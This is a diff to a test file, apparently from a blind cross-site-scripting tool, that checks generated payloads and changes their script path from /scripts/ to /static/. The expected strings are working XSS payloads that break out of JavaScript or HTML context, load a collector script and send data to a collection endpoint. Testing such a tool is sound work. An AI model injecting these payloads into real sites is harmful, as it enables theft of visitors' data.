@@ -30,7 +30,7 @@ def test_generate_payload(client):
     assert str.encode(expected_response) in rv.data
     rv = generate_payload(client, access_header, client_id=1, code="js", i_want_it_all=1, url="http://127.0.0.1")
     expected_response = (
-        ';};var js=document.createElement("script");js.src="http://127.0.0.1/scripts/collector.min.js";js.onload=function(){sendData("http://127.0.0.1/api/x/r/'
+        ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){sendData("http://127.0.0.1/api/x/r/'
         + client_name1.uid
         + '","")};document.body.appendChild(js);'
     )
@@ -48,7 +48,7 @@ def test_generate_payload(client):
     assert str.encode(expected_response) in rv.data
     rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="html", i_want_it_all=1)
     expected_response = (
-        '\'>"><script src=http://127.0.0.1/scripts/collector.min.js></script><script>sendData("http://127.0.0.1/api/x/r/' + client_name1.uid + '", "")</script>'
+        '\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("http://127.0.0.1/api/x/r/' + client_name1.uid + '", "")</script>'
     )
     assert str.encode(expected_response) in rv.data
     rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="html")
